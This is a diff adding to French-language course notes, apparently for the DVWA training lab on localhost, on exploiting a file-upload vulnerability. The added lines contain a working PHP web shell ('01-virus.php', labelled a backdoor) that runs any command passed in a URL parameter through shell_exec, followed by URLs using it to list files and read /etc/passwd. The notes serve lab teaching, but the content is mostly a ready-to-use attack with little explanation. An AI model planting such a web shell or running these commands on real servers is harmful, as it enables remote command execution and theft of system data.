@@ -60,4 +60,23 @@ http://127.0.0.1:4280/vulnerabilities/upload/../../hackable/uploads/01-fichier.p
 
 - 
 - créer un fichier php contient un code "backdoor"
+
+```php
+<?php 
+// 01-virus.php
+// backdoor 
+// pouvoir écrire une commande
+$cmd = $_GET["cmd"]; 
+// exécuter la commande
+$resultat = shell_exec($cmd) ; 
+// afficher le retour visuel de la commande 
+echo "<pre>";
+var_dump($resultat);
+```
+
 - exploiter la backdoor 
+
+http://127.0.0.1:4280/vulnerabilities/upload/../../hackable/uploads/01-virus.php?cmd=ls -al
+http://127.0.0.1:4280/vulnerabilities/upload/../../hackable/uploads/01-virus.php?cmd=cat /etc/passwd
+
+http://127.0.0.1:4280/vulnerabilities/upload/../../hackable/uploads/01-virus.php?cmd=cat /etc/passwd
